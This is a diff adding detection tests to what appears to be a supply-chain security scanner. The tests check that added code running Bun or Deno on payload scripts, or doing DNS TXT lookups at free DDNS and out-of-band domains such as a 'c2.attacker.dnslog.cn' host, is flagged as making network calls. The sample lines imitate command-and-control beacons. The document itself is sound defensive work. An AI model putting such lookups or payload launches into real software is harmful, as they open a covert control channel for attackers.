@@ -3063,3 +3063,79 @@ def test_build_diff_vscode_tasks_flagged_in_diff_summary(tmp_path):
     summary, *_ = _build_diff(old, new)
     assert "SUSPICIOUS" in summary
     assert ".vscode/tasks.json" in summary
+
+
+# ---------------------------------------------------------------------------
+# Cross-runtime Bun/Deno subprocess + free DDNS C2 (loop iteration 8)
+# ---------------------------------------------------------------------------
+
+
+def test_net_calls_bun_subprocess_py():
+    """Python subprocess calling Bun to run a .js payload sets network_calls_in_lib."""
+    assert (
+        _added_lines_have_net_calls(
+            ["subprocess.run(['bun', 'router_runtime.js'], check=True)"],
+            ".py",
+        )
+        is True
+    )
+
+
+def test_net_calls_deno_subprocess_py():
+    """Python subprocess calling Deno to run a .mjs payload sets network_calls_in_lib."""
+    assert (
+        _added_lines_have_net_calls(
+            ["subprocess.Popen(['deno', 'run', 'payload.mjs'])"],
+            ".py",
+        )
+        is True
+    )
+
+
+def test_bun_subprocess_in_new_py_file_sets_net_calls(tmp_path):
+    """New Python library file calling Bun runtime sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "pkg/_runtime/loader.py": (
+                "import subprocess\n"
+                "subprocess.run(['bun', 'router_runtime.js'])\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_freemyip_py():
+    """freemyip.com domain in Python sets network_calls_in_lib (DNS TXT C2 free DDNS)."""
+    assert (
+        _added_lines_have_net_calls(
+            ["host = socket.gethostbyname('cmd.dnslog-cdn-images.freemyip.com')"],
+            ".py",
+        )
+        is True
+    )
+
+
+def test_net_calls_freemyip_go():
+    """freemyip.com domain in Go sets network_calls_in_lib (Go Decimal typosquat)."""
+    assert (
+        _added_lines_have_net_calls(
+            ['txts, _ = net.LookupTXT("dnslog-cdn-images.freemyip.com")'],
+            ".go",
+        )
+        is True
+    )
+
+
+def test_net_calls_dnslog_cn_go():
+    """dnslog.cn domain in Go sets network_calls_in_lib (DNS C2 free OOB provider)."""
+    assert (
+        _added_lines_have_net_calls(
+            ['records, _ := net.LookupTXT("c2.attacker.dnslog.cn")'],
+            ".go",
+        )
+        is True
+    )
